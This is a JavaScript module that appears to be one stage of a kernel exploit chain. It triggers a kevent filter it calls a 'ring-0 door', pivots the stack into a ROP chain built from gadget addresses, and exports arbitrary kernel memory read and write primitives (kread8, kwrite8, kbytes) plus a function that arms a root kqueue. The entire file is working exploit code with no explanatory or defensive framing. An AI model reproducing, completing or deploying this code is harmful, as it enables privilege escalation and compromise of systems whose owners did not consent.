import { hxBridge } from "./hx_kevent.js";

// Stage 4+: kread/kwrite via the -23 ring-0 door.
// Decoded from Hx1400.class kb0/kb1/kread/kwrite/kbytes/uq/kgo (2026-11-02).
const b = hxBridge();
const P = b.P;
const ka = (rva) => b.ka(Number(rva));

const GIDENT = 0x31344b5052544f4fn;   // "OORTPK41" (probe pc 9019)
const MAGIC  = 0x4d4d524f4f544a31n;   // chain completion marker (kb1 pc 17)

// one 4096B arena: STACK@0x000 RES@0x600 MARK@0x680 CTX@0x700 (probe pc 8974-9015)
const arena = b.allocBuf(4096);
b.zeroBuf(arena);
const STACK = arena.addr, RES = STACK + 0x600n, MARK = STACK + 0x680n, CTX = STACK + 0x700n;
const cl = b.allocBuf(64);            // changelist scratch (arm + kgo)

const G = { PRAX:21, PRDX:22, PRDI:23, SAVE:18, REST:19, CONT:20,
            LDRAX:26, ADDRAX:27, STRAXRDX:28, STRDIRAX:29, POPRSP:17, UCRED:24, RAXRCX:25 };
const gad = (i) => ka(P[i]);

function w8(idx, val) { arena.dv.setBigUint64(idx * 8, BigInt.asUintN(64, BigInt(val)), true); return idx + 1; }

function kb0(idx) {                       // [PRDI][CTX][SAVE]
  idx = w8(idx, gad(G.PRDI)); idx = w8(idx, CTX); idx = w8(idx, gad(G.SAVE)); return idx;
}
function kb1(idx) {                       // completion + re-arm tail (27 entries)
  idx = w8(idx, gad(G.PRAX)); idx = w8(idx, MAGIC);
  idx = w8(idx, gad(G.PRDI)); idx = w8(idx, MARK); idx = w8(idx, gad(G.STRDIRAX)); idx = w8(idx, 0);
  idx = w8(idx, gad(G.PRAX)); idx = w8(idx, CTX + 16n); idx = w8(idx, gad(G.LDRAX)); idx = w8(idx, 0);
  idx = w8(idx, gad(G.PRDX)); idx = w8(idx, -120n); idx = w8(idx, gad(G.ADDRAX)); idx = w8(idx, 0);
  idx = w8(idx, gad(G.PRDI)); idx = w8(idx, CTX + 8n); idx = w8(idx, gad(G.STRDIRAX)); idx = w8(idx, 0);
  idx = w8(idx, gad(G.PRAX)); idx = w8(idx, gad(G.CONT));
  idx = w8(idx, gad(G.PRDI)); idx = w8(idx, CTX); idx = w8(idx, gad(G.STRDIRAX)); idx = w8(idx, 0);
  idx = w8(idx, gad(G.PRDI)); idx = w8(idx, CTX); idx = w8(idx, gad(G.REST)); return idx;
}
function kgo(kq) {                      // fire the door (bytecode kgo)
  arena.dv.setBigUint64(0x680 / 8 * 8, 0n, true);  // [MARK]=0
  b.zeroBuf(cl);
  cl.dv.setBigUint64(0, GIDENT, true);
  cl.dv.setUint16(8, 0xffe9, true);     // filter -23
  cl.dv.setUint16(10, 1, true);         // EV_ADD
  cl.dv.setBigUint64(32, gad(G.POPRSP), true);     // entry[1].ident = pivot gadget
  cl.dv.setBigUint64(40, STACK, true);              // entry[1].filter = gSTACK
  const rc = b.scn("kevent", kq, cl.addr, 2, 0, 0, 0);
  const done = arena.dv.getBigUint64(0x680, true) === MAGIC;
  b.log("KGO", "rc=" + rc + " marker=" + (done ? "OK" : "MISS"));
  return done;
}
export function kread8(kq, kaddr) {
  let i = kb0(0);
  i = w8(i, gad(G.PRAX)); i = w8(i, kaddr); i = w8(i, gad(G.LDRAX)); i = w8(i, 0);
  i = w8(i, gad(G.PRDI)); i = w8(i, RES); i = w8(i, gad(G.STRDIRAX)); i = w8(i, 0);
  kb1(i);
  if (!kgo(kq)) b.fin("kread: marker miss @ " + b.h16(kaddr));
  return arena.dv.getBigUint64(0x600, true);
}
export function kwrite8(kq, kaddr, val) {
  let i = kb0(0);
  i = w8(i, gad(G.PRAX)); i = w8(i, kaddr);
  i = w8(i, gad(G.PRDX)); i = w8(i, val); i = w8(i, gad(G.STRAXRDX)); i = w8(i, 0);
  kb1(i);
  if (!kgo(kq)) b.fin("kwrite: marker miss @ " + b.h16(kaddr));
}
export function kbytes(kq, addr, len) {   // unaligned read (1/2/4/8) — bytecode kbytes
  const a = addr & ~7n, sh = Number(addr & 7n) * 8;
  let v = kread8(kq, a) >> BigInt(sh);
  if (sh && Number(addr & 7n) + len > 8)
    v |= (kread8(kq, a + 8n) << BigInt(64 - sh)) & ((1n << BigInt((Number(addr & 7n) + len) * 8)) - 1n);
  return v & ((1n << BigInt(len * 8)) - 1n);
}
export function armRootKq() {             // probe pc 9074-9160: kqueue + one-time -23 arm
  const kq = b.scn("kqueue");
  if (kq < 0) b.fin("root kqueue failed");
  b.zeroBuf(cl);
  cl.dv.setBigUint64(0, GIDENT, true);
  cl.dv.setUint16(8, 0xffe9, true);
  cl.dv.setUint16(10, 1, true);
  const rc = b.scn("kevent", kq, cl.addr, 1, 0, 0, 0);
  b.log("ARM", "rootKq=" + kq + " arm rc=" + rc + (rc < 0 ? " (arm failed)" : " (hooked)"));
  return kq;
}
